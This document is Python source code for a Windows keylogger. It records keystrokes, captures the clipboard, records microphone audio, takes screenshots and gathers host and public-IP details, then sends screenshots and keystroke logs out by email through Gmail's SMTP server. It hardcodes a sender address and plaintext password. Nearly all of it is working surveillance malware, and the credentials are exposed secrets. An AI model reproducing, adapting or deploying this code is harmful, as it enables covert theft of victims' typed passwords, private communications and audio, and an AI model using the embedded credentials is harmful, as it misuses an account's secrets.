#Libraries

from email.mime import text
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os
from datetime import datetime

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Variables

keys_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard_info.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

email_address = "tempsiddemail@gmail.com"
password = "hCNE@UaUzYAw8xzT"
to_email_address = "tempsiddemail@gmail.com"

microphone_time = 10
time_iterations = 15
number_of_iterations_end = 3

file_path = "E:\\Coding\\Python\\Keylogger\\src"
extend = "\\"


# Functions

####### Mailing

def send_mail(filename, attachment, toaddr):
    currTime = datetime.now()
    time_str = currTime.strftime("%d/%m/%Y %H:%M:%S")
    
    fromaddr = email_address
    
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File | " + time_str
    body = "Body of the mail"
    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    payload = MIMEBase('application', 'octet-stream')
    payload.set_payload((attachment).read())
    encoders.encode_base64(payload)
    payload.add_header('Content-Disposition', 'attachment; filename= %s' % filename)

    msg.attach(payload)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)

    text = msg.as_string()

    server.sendmail(fromaddr, toaddr, text)
    server.quit()


####### Geting PC info

def computer_information():
    with open(file_path + extend + system_information, 'a') as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
        except Exception:
            f.write("Couldn't get Public IP Address")
        
        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + IPAddr + '\n')
        f.write('\n')

####### Getting Clipboard Info

def copy_clipboard_info():
    with open(file_path + extend + clipboard_information, 'a') as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard INFO: " + data + "\n\n")

        except:
            f.write("Clipboard could not be coppied.\n\n")


####### Getting Audio Info

def microphone():
    fs = 4400
    seconds = microphone_time

    my_recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, my_recording)


####### Getting Screenshots

def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)


####### Timer

number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iterations

####### Getting Keyboard Info

count = 0
keys = []

def on_press(key):
    global keys, count, currentTime
    
    print(key)
    keys.append(key)
    count += 1
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


####### Writing to a File

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
                f.close()
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

def on_release(key):
    if key == Key.esc:
        return False
    if currentTime > stoppingTime:
        return False


####### The Main Function
 
def main():
    global keys, count, number_of_iterations, currentTime, stoppingTime
    
    computer_information()
    microphone()

    while number_of_iterations < number_of_iterations_end:
        keys = []
        count = 0

        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

        if currentTime > stoppingTime:
            with open(file_path + extend + keys_information, "w") as f:
                f.write(" ")
            
            screenshot()
            send_mail(screenshot_information, file_path + extend + screenshot_information, to_email_address)
            
            copy_clipboard_info()

            number_of_iterations += 1

            currentTime = time.time()
            stoppingTime = time.time() + time_iterations


    send_mail(keys_information, file_path + extend + keys_information, to_email_address)

if __name__ == "__main__":
    main()